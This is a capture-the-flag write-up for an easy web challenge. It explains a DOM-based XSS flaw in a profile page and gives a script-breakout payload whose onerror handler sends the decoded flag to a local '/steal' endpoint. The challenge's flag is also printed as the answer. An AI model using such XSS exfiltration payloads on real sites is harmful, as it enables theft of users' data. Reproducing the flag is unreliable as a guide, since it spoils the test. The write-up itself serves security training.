# 👁️ Shadow Profile

**🏷️ Category**: Web  
**🟢 Difficulty**: Easy  
**📖 Description**:  
We intercepted a shadow agent's internal profile page. It loads user data dynamically using client-side JavaScript. A hidden flag is embedded in the code — but only accessible through exploitation. Prove you can bypass their "security" and exfiltrate the flag.

---

### 💥 Solution

The page uses `window.location.hash` to load a user alias and inserts it unsafely into a JavaScript string inside an inline `<script>` tag via `innerHTML`. This creates a **DOM-based XSS in JS context**.

1. The flag is stored as a hex-encoded array in the global variable `__HEX__`.
2. It can be decoded by calling the function `getSecretFlag()`.
3. To exploit, inject a payload that breaks out of the JS string and calls this function:

  	 ```text
	</script><img src=x onerror="fetch('http://localhost:8080/steal?flag='+encodeURIComponent(getSecretFlag()))">
	```
4.Submit the payload via the input field → the flag is sent to your checker. 
>💡 Tip: Open DevTools → Network tab to confirm the request was sent!

---


### 🏁 Flag

**CTF{sh4d0w_d0m_xss_1s_r34l}**
